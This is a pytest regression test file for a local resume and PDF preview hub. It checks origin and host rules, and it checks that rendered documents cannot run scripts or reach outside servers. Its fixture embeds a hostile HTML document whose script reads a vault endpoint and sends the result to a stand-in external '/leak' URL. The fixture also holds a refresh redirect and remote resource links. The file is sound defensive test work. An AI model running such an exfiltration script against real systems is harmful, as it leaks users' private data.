"""Regression tests for the trust boundary between documents and the Hub."""

import threading
from http.client import HTTPConnection
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import quote

import pytest

from pdf_tool.preview import load_palettes, make_handler, scan_documents


@pytest.fixture
def hub(tmp_path):
    source = tmp_path / "documents" / "fictional # example.html"
    source.parent.mkdir()
    (source.parent / "layout.css").write_text(
        ".page { width: 680px; border-top: 3px solid rgb(16, 32, 64); }", encoding="utf-8"
    )
    secret = tmp_path / "vaults" / "fictional.json"
    secret.parent.mkdir()
    secret.write_text('{"id":"fictional","claims":[]}', encoding="utf-8")
    # One server records any attempted outgoing document request.
    external_hits = []
    class External(BaseHTTPRequestHandler):
        def do_GET(self):
            external_hits.append(self.path)
            self.send_response(204)
            self.end_headers()

    external = ThreadingHTTPServer(("127.0.0.1", 0), External)
    external_url = f"http://127.0.0.1:{external.server_port}"
    source.write_text(f"""<!doctype html><html data-starter-resume>
      <meta http-equiv="refresh" content="0;url={external_url}/navigate">
      <link rel="stylesheet" href="layout.css">
      <link rel="stylesheet" href="{external_url}/stylesheet">
      <link rel="prefetch" href="{external_url}/prefetch">
      <style>@page {{ size: Letter; margin: 0.65in; }}</style>
      <article class="page">Fictional resume preview</article>
      <img src="{external_url}/img">
      <iframe src="/vault"></iframe>
      <script>
        document.body.dataset.executed = 'yes';
        fetch('/api/vault-overview?profile=fictional')
          .then(response => response.text())
          .then(data => fetch('{external_url}/leak?data=' + encodeURIComponent(data)));
        fetch('/api/save-starter', {{method: 'POST', body: '{{}}'}});
        document.querySelector('.page').textContent = 'Script ran';
      </script>""", encoding="utf-8")
    server = ThreadingHTTPServer(
        ("127.0.0.1", 0), make_handler(tmp_path, scan_documents(tmp_path), load_palettes(tmp_path))
    )
    for instance in (external, server):
        threading.Thread(target=instance.serve_forever, daemon=True).start()
    try:
        yield server.server_port, source.relative_to(tmp_path).as_posix(), external_hits
    finally:
        for instance in (server, external):
            instance.shutdown()
            instance.server_close()


def request(port, path, method="GET", headers=None, payload=None):
    connection = HTTPConnection("127.0.0.1", port, timeout=30)
    try:
        connection.request(method, path, body=payload, headers=headers or {})
        response = connection.getresponse()
        return response.status, response.read()
    finally:
        connection.close()


def test_only_local_requests_and_document_assets_are_served(hub):
    port, doc, _ = hub
    vault = "/api/vault-overview?profile=fictional"
    assert request(port, vault)[0] == 200
    assert request(port, vault, headers={"Host": f"untrusted.invalid:{port}"})[0] == 403
    assert request(port, vault, headers={"Origin": "null"})[0] == 403
    assert request(port, vault, headers={"Sec-Fetch-Site": "same-site"})[0] == 403
    assert request(port, "/vaults/fictional.json")[0] == 404
    assert request(port, "/" + quote(doc))[0] == 200

    api = "/api/import-resume"
    json_headers = {"Content-Type": "application/json"}
    assert request(port, api, "POST", {**json_headers, "Origin": "https://untrusted.invalid"}, "{}")[0] == 403
    assert request(port, api, "POST", {**json_headers, "Origin": "null"}, "{}")[0] == 403
    assert request(port, api, "POST", {**json_headers, "Sec-Fetch-Site": "same-site"}, "{}")[0] == 403
    assert request(port, api, "POST", {"Content-Type": "text/plain"}, "{}")[0] == 415
    assert request(port, api, "POST", json_headers, "{}")[0] == 200


def test_chromium_preview_and_exports_cannot_run_document_code(hub, tmp_path):
    playwright = pytest.importorskip("playwright.sync_api")
    from pypdf import PdfReader

    port, doc, external_hits = hub
    origin = f"http://127.0.0.1:{port}"
    with playwright.sync_playwright() as driver:
        browser = driver.chromium.launch()
        page = browser.new_page()
        requests = []
        page.on("request", lambda item: requests.append(item.url))
        page.goto(origin + "/?doc=" + quote(doc))
        frame = page.frame_locator("#main")
        assert frame.locator(".page").inner_text() == "Fictional resume preview"
        assert frame.locator(".page").evaluate("(node) => getComputedStyle(node).borderTopWidth") == "3px"
        assert frame.locator("body").get_attribute("data-executed") is None
        compact = browser.new_page(viewport={"width": 428, "height": 926})
        compact.goto(origin + "/?no-splash=1&doc=" + quote(doc))
        compact.frame_locator("#main").locator(".page").evaluate("""
            async (node) => {
              for (let i = 0; i < 30; i++) {
                if (node.getBoundingClientRect().right <= node.ownerDocument.documentElement.clientWidth) return;
                await new Promise(resolve => requestAnimationFrame(resolve));
              }
              throw new Error("Narrow document preview is clipped");
            }
        """)
        compact.close()
        export_options = page.get_by_label("Export options", exact=True)
        export_options.click()
        page.locator("#paletteTrigger").click()
        page.locator("#paletteMenu .hub-select-option").nth(1).click()
        assert frame.locator("html").evaluate("(node) => node.style.getPropertyValue('--primary')").strip()
        page.keyboard.press("Escape")
        assert not any("/api/vault-overview" in url or url == origin + "/vault" for url in requests)

        direct = browser.new_page()
        direct.goto(origin + "/" + quote(doc))
        assert direct.locator(".page").inner_text() == "Fictional resume preview"
        assert direct.locator("body").get_attribute("data-executed") is None

        for format_name in ("pdf-light", "pdf-dark", "pdf-grayscale", "png-light"):
            file_type, appearance = format_name.split("-")
            format_label = f"{file_type.upper()} {appearance}"
            if appearance == "grayscale":
                format_label += " (print)"
            with page.expect_response(lambda response: response.url == origin + "/api/export") as export:
                export_options.click()
                page.locator("#fmtTrigger").click()
                page.locator("#fmtMenu").get_by_role("button", name=format_label, exact=True).click()
                page.locator("#exportBtn").click()
            data = export.value.json()
            assert data["ok"], data
            output = tmp_path / data["outputs"][0]
            assert output.stat().st_size > 0
            if format_name.startswith("pdf"):
                text = PdfReader(output).pages[0].extract_text()
                assert "Fictional resume preview" in text
                assert "Script ran" not in text
        pdf = "_exports/unfiled/fictional # example-light.pdf"
        page.locator("#refreshBtn").dispatch_event("click")
        page.locator(f'.thumb[data-path="{pdf}"]').click()
        page.frame_locator("#main").locator(".pdf-page").first.wait_for()
        browser.close()

    assert external_hits == []
